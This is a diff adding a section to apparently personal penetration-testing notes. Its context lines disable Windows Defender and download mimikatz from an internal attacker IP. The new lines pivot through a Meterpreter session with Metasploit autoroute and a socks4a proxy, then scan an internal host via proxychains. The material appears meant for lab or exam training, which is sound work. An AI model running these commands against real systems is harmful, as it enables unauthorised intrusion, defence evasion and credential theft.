@@ -186,3 +186,29 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Invoke-WebRequest "http://192.168.45.239/mimikatz64.exe" -OutFile ".\m.exe"
 > Then You can download minikatz etc. without deleted.
 ```
+# Proxychains with Msfconsole
+```
+use post/multi/manage/autoroute
+set SESSION X
+set SUBNET 172.16.X.0
+set NETMASK 255.255.255.0
+> You can autoroute with meterpreter.
+
+
+use auxiliary/server/socks4a
+set SRVHOST 127.0.0.1
+set SRVPORT 8090
+set version 4a
+run
+> In meterpreter you can create a socks proxy listener.
+
+> After background proxy job, you can use proxychains.
+> The last line has the default port number in /etc/proxychains4.conf
+
+proxychains telnet 172.16.X.150 80
+proxychains nmap 172.16.X.150 -Pn -v
+proxychains firefox
+proxychains curl http://172.16.X.150/index.html
+
+```
+
